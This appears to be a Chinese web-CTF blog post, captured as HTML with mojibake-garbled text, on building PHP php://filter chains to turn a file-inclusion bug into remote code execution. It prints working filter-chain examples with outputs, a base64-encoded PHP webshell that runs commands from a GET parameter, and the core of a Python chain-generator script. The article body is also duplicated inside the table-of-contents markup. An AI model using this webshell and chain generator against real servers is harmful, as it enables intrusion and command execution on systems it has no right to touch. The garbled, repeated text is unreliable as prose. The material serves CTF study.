</span></a></li><li class="toc-item toc-level-6"><a class="toc-link"><span class="toc-number">1.0.1.0.0.4.</span> <span class="toc-text">æ‰€ä¼ å‚æ•°ä½æ•°ä¸º4*n+3


æ­¤æ—¶ç›¸å½“äºè‡ªåŠ¨è¡¥å…¨ä¸€ä¸ªç­‰å·åè§£ç 
&lt;2&gt;base64è§£ç æ—¶ï¼Œä¼šå¿½ç•¥å…¶ä¸­çš„éå­—æ¯æ•°å­—+&#x2F;&#x3D;,å…¶ä¸­å¯¹äºä¸åœ¨æœ«å°¾çš„ç­‰å·ï¼Œä¹Ÿä¼šè¿›è¡Œå¿½ç•¥

&lt;3&gt;å¯¹äºä¸€ä¸ªå·²ç»èƒ½å¤Ÿè§£ç çš„å­—ç¬¦ä¸²ï¼Œåœ¨å…¶åé¢æ— è®ºåŠ å…¥å¤šå°‘å­—ç¬¦ï¼Œéƒ½ä¸ä¼šå½±å“è¯¥å­—ç¬¦ä¸²çš„è§£ç ç»“æœ

ç¼–ç è¿‡æ»¤å™¨çš„ç‰¹æ€§

è¿‡æ»¤å™¨çš„å åŠ ç»„åˆï¼Œå¯ä»¥åœ¨åŸå§‹å­—ç¬¦å‰æ·»åŠ ä¸€äº›å­—ç¬¦ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹é¢çš„ä¾‹å­
12345&lt;?php echo file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;); è¿è¡Œç»“æœ:$)Csunrt 

æˆ‘ä»¬å‘ç°ï¼Œå¤šäº†å‡ ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯ï¼Œæˆ‘ä»¬è¯´è¿‡å‰é¢base64çš„ç‰¹æ€§ï¼Œåœ¨è§£ç æ—¶ï¼Œä¼šå¿½ç•¥æ‰éæ•°å­—å­—ç¬¦+&#x2F;&#x3D;ï¼Œé‚£å¦‚æœæˆ‘ä»¬æ·»åŠ base64decodeè¿‡æ»¤å™¨ï¼Œå†æ·»åŠ base64encodeè¿‡æ»¤å™¨ï¼Œé‚£ä¹ˆè¿™äº›å­—ç¬¦å°±ä¼šæ¶ˆå¤±ï¼Œåªç•™ä¸‹Cå­—ç¬¦
12345678&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;echo base64_encode(base64_decode(&quot;Csunrt&quot;));è¿è¡Œç»“æœï¼šCsunrg&#x3D;&#x3D;Csunrg&#x3D;&#x3D;

æ­¤æ—¶æˆ‘ä»¬å®Œæˆäº†ä¸€é¡¹ä»»åŠ¡ï¼Œå°±æ˜¯åœ¨å·²æœ‰çš„æ•°æ®å‰é¢ï¼Œå†æ¬¡æ·»åŠ åˆ«çš„å­—ç¬¦ï¼Œæˆ‘ä»¬èƒ½çœ‹åˆ°ï¼Œè¿è¡Œçš„ç»“æœç¨ç¨æ”¹å˜äº†åŸæœ‰çš„å­—ç¬¦ï¼Œè¿™ä¸é‡è¦ï¼Œå› ä¸ºæ”¹å˜çš„å¾€å¾€éƒ½æ˜¯æœ€åçš„å­—ç¬¦ï¼Œæˆ‘ä»¬åªè¦ä¿è¯æ·»åŠ çš„å­—ç¬¦ä¸è¢«æ”¹å˜å°±è¡Œï¼Œæ­¤æ—¶æˆ‘ä»¬å®Œæˆäº†ä¸€ä¸ªå­—ç¬¦çš„æ·»åŠ ï¼Œè¿™è¿œè¿œä¸å¤Ÿï¼Œä¸€ä¸ªå­—ç¬¦æ”¹å˜ä¸äº†ä»»ä½•ä¸œè¥¿ï¼Œé‚£ä¹ˆå¦‚ä½•æ·»åŠ æ›´å¤šçš„å­—ç¬¦å‘¢ï¼Œæˆ‘ä»¬æ¥çœ‹
123456&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;è¿è¡Œç»“æœï¼šÃ·Ã¥Â€4sunrt

ä¸å‡ºæ‰€æ–™çš„è¯ï¼Œæ·»åŠ base64è¿‡æ»¤å™¨åï¼Œå°±ä¼šå‘åŸå§‹æ•°æ®å‰é¢æ·»åŠ 4
123456&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;è¿è¡Œç»“æœï¼š4sunrg&#x3D;&#x3D;

é‚£ä¹ˆï¼Œæ·»åŠ 4Cå°±å¯ä»¥è¿™æ ·åš
1234567&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;è¿è¡Œç»“æœï¼š4Csunrg&#x3D;

åªéœ€è¦ç®€å•çš„æ‹¼æ¥ï¼Œå°±èƒ½å¤Ÿæ·»åŠ å¤šä¸ªå­—ç¬¦ï¼Œä½†æ˜¯æ­¤æ—¶åªèƒ½æ·»åŠ base64_decodeå‡½æ•°è®¤è¯çš„å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯å­—æ¯æ•°å­—+&#x2F;&#x3D;ï¼Œå¯¹æˆ‘ä»¬æ¥è¯´é™åˆ¶è¿˜æ˜¯å¾ˆå¤§ï¼Œå› ä¸ºæ¶æ„ä»£ç è‚¯å®šå¸¦æœ‰å­—ç¬¦
è¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå…¶å®ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯æˆ‘ä»¬æ„é€ ä¸€ä¸²æ¶æ„ä»£ç çš„base64ç¼–ç å€¼ï¼Œé‚£è¿™ä¸ªç¼–ç å€¼ï¼Œè‚¯å®šæ˜¯å­—æ¯æ•°å­—+&#x2F;&#x3D;ï¼Œæœ€åæˆ‘ä»¬å†æ¬¡æ·»åŠ ä¸€ä¸ªbase64-decodeè¿‡æ»¤å™¨ï¼Œæ­¤æ—¶ï¼Œæ¶æ„ä»£ç å°±ä¼šè¢«è¿˜åŸ
æ¯”å¦‚æˆ‘ä»¬æƒ³è¦æ„é€ ï¼Œé‚£ä¹ˆç›´æ¥æ„é€ PD89YCRfR0VUWzBdYDs7Pz4&#x3D;å³å¯ï¼Œæ„é€ å®Œæˆåï¼Œç›´æ¥å†æ¬¡åœ¨æ„é€ çš„æœ«å°¾æ·»åŠ |convert.base64-decodeå³å¯ï¼Œæ­¤æ—¶æ¶æ„ä»£ç å°±ä¼šè¢«è§£ç ï¼Œå¦‚æœå­˜åœ¨åŒ…å«æ¼æ´ï¼Œé‚£å°±å¯ä»¥RCEäº†
æƒ³è¦æ„é€ çš„å­—ç¬¦å“ªé‡Œæ¥

ç¬¬ä¸€ç§å½“ç„¶æ˜¯å†™è„šæœ¬ï¼Œæ…¢æ…¢å°è¯•äº†ï¼Œä½†æ˜¯å·²ç»æœ‰äººæ›¿æˆ‘ä»¬æ•´ç†å¥½äº†ï¼šå­—ç¬¦çš„æ•´ç†
ç”¨äºæ¢­å“ˆçš„è„šæœ¬ä»¥åŠè„šæœ¬çš„åˆ†æ

æ¢­å“ˆè„šæœ¬
1234567891011121314151617181920212223def generate_filter_chain(chain, debug_base64 &#x3D; False):    encoded_chain &#x3D; chain    # generate some garbage base64    filters &#x3D; &quot;convert.iconv.UTF8.CSISO2022KR|&quot;    filters +&#x3D; &quot;convert.base64-encode|&quot;    # make sure to get rid of any equal signs in both the string we just generated and the rest of the file    filters +&#x3D; &quot;convert.iconv.UTF8.UTF7|&quot;    for c in encoded_chain[::-1]:        filters +&#x3D; conversions[c] + &quot;|&quot;        # decode and reencode to get rid of everything that isn&#39;t valid base64        filters +&#x3D; &quot;convert.base64-decode|&quot;        filters +&#x3D; &quot;convert.base64-encode|&quot;        # get rid of equal signs        filters +&#x3D; &quot;convert.iconv.UTF8.UTF7|&quot;    if not debug_base64:        # don&#39;t add the decode while debugging chains        filters +&#x3D; &quot;convert.base64-decode&quot;    final_payload &#x3D; f&quot;php:&#x2F;&#x2F;filter&#x2F;{filters}&#x2F;resource&#x3D;{file_to_use}&quot;    return final_payload

ä¸Šé¢ä¸ºèŠ‚é€‰çš„æ ¸å¿ƒä»£ç ï¼Œå”¯ä¸€ä¸åŒçš„æ˜¯ï¼Œå‰é¢å¤šäº†ä¸€äº›ä¸œè¥¿ï¼Œå’Œæ¯æ¬¡å¾ªç¯åé¢å¤šäº†convert.iconv.UTF8.UTF7|ï¼Œè¿™ä¸ªæ˜¯ä¸ºäº†å»é™¤ç©ºæ ¼ï¼Œå‰é¢å¤šçš„åˆ™æ˜¯ï¼Œå½“æˆ‘ä»¬åŒ…å«çš„æ–‡ä»¶ä¸ºç©ºæ—¶ï¼Œä½¿å­—ç¬¦èƒ½å¤Ÿæ­£å¸¸æ·»åŠ ä¸è§£æï¼Œè¿™ä¸¤å¤„ç»†èŠ‚å½±å“ä¸å¤§ï¼Œæ‡‚å‰é¢çš„æ·»åŠ å­—ç¬¦å³å¯
</span></a></li><li class="toc-item toc-level-6"><a class="toc-link"><span class="toc-number">1.0.1.0.0.5.</span> <span class="toc-text">


æ­¤æ—¶ç›¸å½“äºè‡ªåŠ¨è¡¥å…¨ä¸€ä¸ªç­‰å·åè§£ç 
&lt;2&gt;base64è§£ç æ—¶ï¼Œä¼šå¿½ç•¥å…¶ä¸­çš„éå­—æ¯æ•°å­—+&#x2F;&#x3D;,å…¶ä¸­å¯¹äºä¸åœ¨æœ«å°¾çš„ç­‰å·ï¼Œä¹Ÿä¼šè¿›è¡Œå¿½ç•¥

&lt;3&gt;å¯¹äºä¸€ä¸ªå·²ç»èƒ½å¤Ÿè§£ç çš„å­—ç¬¦ä¸²ï¼Œåœ¨å…¶åé¢æ— è®ºåŠ å…¥å¤šå°‘å­—ç¬¦ï¼Œéƒ½ä¸ä¼šå½±å“è¯¥å­—ç¬¦ä¸²çš„è§£ç ç»“æœ

ç¼–ç è¿‡æ»¤å™¨çš„ç‰¹æ€§

è¿‡æ»¤å™¨çš„å åŠ ç»„åˆï¼Œå¯ä»¥åœ¨åŸå§‹å­—ç¬¦å‰æ·»åŠ ä¸€äº›å­—ç¬¦ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹é¢çš„ä¾‹å­
12345&lt;?php echo file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;); è¿è¡Œç»“æœ:$)Csunrt 

æˆ‘ä»¬å‘ç°ï¼Œå¤šäº†å‡ ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯ï¼Œæˆ‘ä»¬è¯´è¿‡å‰é¢base64çš„ç‰¹æ€§ï¼Œåœ¨è§£ç æ—¶ï¼Œä¼šå¿½ç•¥æ‰éæ•°å­—å­—ç¬¦+&#x2F;&#x3D;ï¼Œé‚£å¦‚æœæˆ‘ä»¬æ·»åŠ base64decodeè¿‡æ»¤å™¨ï¼Œå†æ·»åŠ base64encodeè¿‡æ»¤å™¨ï¼Œé‚£ä¹ˆè¿™äº›å­—ç¬¦å°±ä¼šæ¶ˆå¤±ï¼Œåªç•™ä¸‹Cå­—ç¬¦
12345678&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;echo base64_encode(base64_decode(&quot;Csunrt&quot;));è¿è¡Œç»“æœï¼šCsunrg&#x3D;&#x3D;Csunrg&#x3D;&#x3D;

æ­¤æ—¶æˆ‘ä»¬å®Œæˆäº†ä¸€é¡¹ä»»åŠ¡ï¼Œå°±æ˜¯åœ¨å·²æœ‰çš„æ•°æ®å‰é¢ï¼Œå†æ¬¡æ·»åŠ åˆ«çš„å­—ç¬¦ï¼Œæˆ‘ä»¬èƒ½çœ‹åˆ°ï¼Œè¿è¡Œçš„ç»“æœç¨ç¨æ”¹å˜äº†åŸæœ‰çš„å­—ç¬¦ï¼Œè¿™ä¸é‡è¦ï¼Œå› ä¸ºæ”¹å˜çš„å¾€å¾€éƒ½æ˜¯æœ€åçš„å­—ç¬¦ï¼Œæˆ‘ä»¬åªè¦ä¿è¯æ·»åŠ çš„å­—ç¬¦ä¸è¢«æ”¹å˜å°±è¡Œï¼Œæ­¤æ—¶æˆ‘ä»¬å®Œæˆäº†ä¸€ä¸ªå­—ç¬¦çš„æ·»åŠ ï¼Œè¿™è¿œè¿œä¸å¤Ÿï¼Œä¸€ä¸ªå­—ç¬¦æ”¹å˜ä¸äº†ä»»ä½•ä¸œè¥¿ï¼Œé‚£ä¹ˆå¦‚ä½•æ·»åŠ æ›´å¤šçš„å­—ç¬¦å‘¢ï¼Œæˆ‘ä»¬æ¥çœ‹
123456&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;è¿è¡Œç»“æœï¼šÃ·Ã¥Â€4sunrt

ä¸å‡ºæ‰€æ–™çš„è¯ï¼Œæ·»åŠ base64è¿‡æ»¤å™¨åï¼Œå°±ä¼šå‘åŸå§‹æ•°æ®å‰é¢æ·»åŠ 4
123456&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;è¿è¡Œç»“æœï¼š4sunrg&#x3D;&#x3D;

é‚£ä¹ˆï¼Œæ·»åŠ 4Cå°±å¯ä»¥è¿™æ ·åš
1234567&lt;?phpecho file_get_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,sunrt&quot;).&quot;\n&quot;;è¿è¡Œç»“æœï¼š4Csunrg&#x3D;

åªéœ€è¦ç®€å•çš„æ‹¼æ¥ï¼Œå°±èƒ½å¤Ÿæ·»åŠ å¤šä¸ªå­—ç¬¦ï¼Œä½†æ˜¯æ­¤æ—¶åªèƒ½æ·»åŠ base64_decodeå‡½æ•°è®¤è¯çš„å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯å­—æ¯æ•°å­—+&#x2F;&#x3D;ï¼Œå¯¹æˆ‘ä»¬æ¥è¯´é™åˆ¶è¿˜æ˜¯å¾ˆå¤§ï¼Œå› ä¸ºæ¶æ„ä»£ç è‚¯å®šå¸¦æœ‰å­—ç¬¦
è¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå…¶å®ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯æˆ‘ä»¬æ„é€ ä¸€ä¸²æ¶æ„ä»£ç çš„base64ç¼–ç å€¼ï¼Œé‚£è¿™ä¸ªç¼–ç å€¼ï¼Œè‚¯å®šæ˜¯å­—æ¯æ•°å­—+&#x2F;&#x3D;ï¼Œæœ€åæˆ‘ä»¬å†æ¬¡æ·»åŠ ä¸€ä¸ªbase64-decodeè¿‡æ»¤å™¨ï¼Œæ­¤æ—¶ï¼Œæ¶æ„ä»£ç å°±ä¼šè¢«è¿˜åŸ
æ¯”å¦‚æˆ‘ä»¬æƒ³è¦æ„é€ ï¼Œé‚£ä¹ˆç›´æ¥æ„é€ PD89YCRfR0VUWzBdYDs7Pz4&#x3D;å³å¯ï¼Œæ„é€ å®Œæˆåï¼Œç›´æ¥å†æ¬¡åœ¨æ„é€ çš„æœ«å°¾æ·»åŠ |convert.base64-decodeå³å¯ï¼Œæ­¤æ—¶æ¶æ„ä»£ç å°±ä¼šè¢«è§£ç ï¼Œå¦‚æœå­˜åœ¨åŒ…å«æ¼æ´ï¼Œé‚£å°±å¯ä»¥RCEäº†
æƒ³è¦æ„é€ çš„å­—ç¬¦å“ªé‡Œæ¥

ç¬¬ä¸€ç§å½“ç„¶æ˜¯å†™è„šæœ¬ï¼Œæ…¢æ…¢å°è¯•äº†ï¼Œä½†æ˜¯å·²ç»æœ‰äººæ›¿æˆ‘ä»¬æ•´ç†å¥½äº†ï¼šå­—ç¬¦çš„æ•´ç†
ç”¨äºæ¢­å“ˆçš„è„šæœ¬ä»¥åŠè„šæœ¬çš„åˆ†æ

æ¢­å“ˆè„šæœ¬
1234567891011121314151617181920212223def generate_filter_chain(chain, debug_base64 &#x3D; False):    encoded_chain &#x3D; chain    # generate some garbage base64    filters &#x3D; &quot;convert.iconv.UTF8.CSISO2022KR|&quot;    filters +&#x3D; &quot;convert.base64-encode|&quot;    # make sure to get rid of any equal signs in both the string we just generated and the rest of the file    filters +&#x3D; &quot;convert.iconv.UTF8.UTF7|&quot;    for c in encoded_chain[::-1]:        filters +&#x3D; conversions[c] + &quot;|&quot;        # decode and reencode to get rid of everything that isn&#39;t valid base64        filters +&#x3D; &quot;convert.base64-decode|&quot;        filters +&#x3D; &quot;convert.base64-encode|&quot;        # get rid of equal signs        filters +&#x3D; &quot;convert.iconv.UTF8.UTF7|&quot;    if not debug_base64:        # don&#39;t add the decode while debugging chains        filters +&#x3D; &quot;convert.base64-decode&quot;    final_payload &#x3D; f&quot;php:&#x2F;&#x2F;filter&#x2F;{filters}&#x2F;resource&#x3D;{file_to_use}&quot;    return final_payload

ä¸Šé¢ä¸ºèŠ‚é€‰çš„æ ¸å¿ƒä»£ç ï¼Œå”¯ä¸€ä¸åŒçš„æ˜¯ï¼Œå‰é¢å¤šäº†ä¸€äº›ä¸œè¥¿ï¼Œå’Œæ¯æ¬¡å¾ªç¯åé¢å¤šäº†convert.iconv.UTF8.UTF7|ï¼Œè¿™ä¸ªæ˜¯ä¸ºäº†å»é™¤ç©ºæ ¼ï¼Œå‰é¢å¤šçš„åˆ™æ˜¯ï¼Œå½“æˆ‘ä»¬åŒ…å«çš„æ–‡ä»¶ä¸ºç©ºæ—¶ï¼Œä½¿å­—ç¬¦èƒ½å¤Ÿæ­£å¸¸æ·»åŠ ä¸è§£æï¼Œè¿™ä¸¤å¤„ç»†èŠ‚å½±å“ä¸å¤§ï¼Œæ‡‚å‰é¢çš„æ·»åŠ å­—ç¬¦å³å¯
</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.2.</span> <span class="toc-text">ç¼–ç è¿‡æ»¤å™¨çš„ç‰¹æ€§</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.3.</span> <span class="toc-text">æƒ³è¦æ„é€ çš„å­—ç¬¦å“ªé‡Œæ¥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.4.</span> <span class="toc-text">ç”¨äºæ¢­å“ˆçš„è„šæœ¬ä»¥åŠè„šæœ¬çš„åˆ†æ</span></a></li></ol></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Filteré“¾ä¹‹php
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">SunRT</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-01-30T14:32:12.000Z" itemprop="datePublished">2025-01-30</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/WEB-CTF/" rel="tag">WEB-CTF</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1>é€šè¿‡phpå‡½æ•°çš„åˆ†æè§£æphpçš„filteré“¾æ„é€ </h1>

<h3>php-base64å‡½æ•°ç‰¹æ€§åˆ†æ</h3>

<!--æ³¨æ„ï¼Œå‡½æ•°çš„ç‰¹æ€§ä¸base64è¿‡æ»¤å™¨ç‰¹æ€§ä¸€è‡´-->

<p><strong>&lt;1&gt;base64è§£ç æ—¶ï¼Œè¦æ±‚æ‰€ä¼ å‚æ•°ä¸º4çš„å€æ•°ï¼Œå¦‚æœæ‰€ä¼ å‚æ•°ä¸æ˜¯4çš„å€æ•°å‘¢ï¼Œæˆ‘ä»¬æ¥é€ä¸ªåˆ†æ</strong></p>
<h6>æ‰€ä¼ å‚æ•°ä½æ•°ä¸º4*n+1</h6>

<p><img src="/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/1.png" alt="1"></p>
<p><strong>æ­¤æ—¶å¹¶ä¸å½±å“è§£ç çš„ç»“æœï¼Œç›¸å½“äºåˆ é™¤æœ€åä¸€ä½åè§£ç </strong></p>
<h6>æ‰€ä¼ å‚æ•°ä½æ•°ä¸º4*n+2<h6>

<p><img src="/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/2.png" alt="2"></p>
<p><strong>æ­¤æ—¶è¿è¡Œç›¸å½“äºè‡ªåŠ¨è¡¥å…¨ä¸¤ä¸ªç­‰å·åè§£ç </strong></p>
<h6>æ‰€ä¼ å‚æ•°ä½æ•°ä¸º4*n+3<h6>

<p><img src="/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/3.png" alt="3"></p>
<p><strong>æ­¤æ—¶ç›¸å½“äºè‡ªåŠ¨è¡¥å…¨ä¸€ä¸ªç­‰å·åè§£ç </strong></p>
<p><strong>&lt;2&gt;base64è§£ç æ—¶ï¼Œä¼šå¿½ç•¥å…¶ä¸­çš„éå­—æ¯æ•°å­—+&#x2F;&#x3D;,å…¶ä¸­å¯¹äºä¸åœ¨æœ«å°¾çš„ç­‰å·ï¼Œä¹Ÿä¼šè¿›è¡Œå¿½ç•¥</strong></p>
<p><img src="/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/4.png" alt="4"></p>
<p><strong>&lt;3&gt;å¯¹äºä¸€ä¸ªå·²ç»èƒ½å¤Ÿè§£ç çš„å­—ç¬¦ä¸²ï¼Œåœ¨å…¶åé¢æ— è®ºåŠ å…¥å¤šå°‘å­—ç¬¦ï¼Œéƒ½ä¸ä¼šå½±å“è¯¥å­—ç¬¦ä¸²çš„è§£ç ç»“æœ</strong></p>
<p><img src="/2025/01/30/Filter%E9%93%BE%E4%B9%8Bphp/5.png" alt="5"></p>
<h3>ç¼–ç è¿‡æ»¤å™¨çš„ç‰¹æ€§</h3>

<p><strong>è¿‡æ»¤å™¨çš„å åŠ ç»„åˆï¼Œå¯ä»¥åœ¨åŸå§‹å­—ç¬¦å‰æ·»åŠ ä¸€äº›å­—ç¬¦ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹é¢çš„ä¾‹å­</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.iconv.UTF8.CSISO2022KR/resource=data://,sunrt&quot;</span>);</span><br><span class="line"> </span><br><span class="line">è¿è¡Œç»“æœ:</span><br><span class="line">$)Csunrt </span><br></pre></td></tr></table></figure>

<p><strong>æˆ‘ä»¬å‘ç°ï¼Œå¤šäº†å‡ ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯ï¼Œæˆ‘ä»¬è¯´è¿‡å‰é¢base64çš„ç‰¹æ€§ï¼Œåœ¨è§£ç æ—¶ï¼Œä¼šå¿½ç•¥æ‰éæ•°å­—å­—ç¬¦+&#x2F;&#x3D;ï¼Œé‚£å¦‚æœæˆ‘ä»¬æ·»åŠ base64decodeè¿‡æ»¤å™¨ï¼Œå†æ·»åŠ base64encodeè¿‡æ»¤å™¨ï¼Œé‚£ä¹ˆè¿™äº›å­—ç¬¦å°±ä¼šæ¶ˆå¤±ï¼Œåªç•™ä¸‹Cå­—ç¬¦</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode/resource=data://,sunrt&quot;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;Csunrt&quot;</span>));</span><br><span class="line"></span><br><span class="line">è¿è¡Œç»“æœï¼š</span><br><span class="line">Csunrg==</span><br><span class="line">Csunrg==</span><br></pre></td></tr></table></figure>

<p><strong>æ­¤æ—¶æˆ‘ä»¬å®Œæˆäº†ä¸€é¡¹ä»»åŠ¡ï¼Œå°±æ˜¯åœ¨å·²æœ‰çš„æ•°æ®å‰é¢ï¼Œå†æ¬¡æ·»åŠ åˆ«çš„å­—ç¬¦ï¼Œæˆ‘ä»¬èƒ½çœ‹åˆ°ï¼Œè¿è¡Œçš„ç»“æœç¨ç¨æ”¹å˜äº†åŸæœ‰çš„å­—ç¬¦ï¼Œè¿™ä¸é‡è¦ï¼Œå› ä¸ºæ”¹å˜çš„å¾€å¾€éƒ½æ˜¯æœ€åçš„å­—ç¬¦ï¼Œæˆ‘ä»¬åªè¦ä¿è¯æ·»åŠ çš„å­—ç¬¦ä¸è¢«æ”¹å˜å°±è¡Œï¼Œæ­¤æ—¶æˆ‘ä»¬å®Œæˆäº†ä¸€ä¸ªå­—ç¬¦çš„æ·»åŠ ï¼Œè¿™è¿œè¿œä¸å¤Ÿï¼Œä¸€ä¸ªå­—ç¬¦æ”¹å˜ä¸äº†ä»»ä½•ä¸œè¥¿ï¼Œé‚£ä¹ˆå¦‚ä½•æ·»åŠ æ›´å¤šçš„å­—ç¬¦å‘¢ï¼Œæˆ‘ä»¬æ¥çœ‹</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE/resource=data://,sunrt&quot;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">è¿è¡Œç»“æœï¼š</span><br><span class="line">Ã·Ã¥Â€<span class="number">4</span>sunrt</span><br></pre></td></tr></table></figure>

<p><strong>ä¸å‡ºæ‰€æ–™çš„è¯ï¼Œæ·»åŠ base64è¿‡æ»¤å™¨åï¼Œå°±ä¼šå‘åŸå§‹æ•°æ®å‰é¢æ·»åŠ 4</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode/resource=data://,sunrt&quot;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">è¿è¡Œç»“æœï¼š</span><br><span class="line"><span class="number">4</span>sunrg==</span><br></pre></td></tr></table></figure>

<p><strong>é‚£ä¹ˆï¼Œæ·»åŠ 4Cå°±å¯ä»¥è¿™æ ·åš</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span 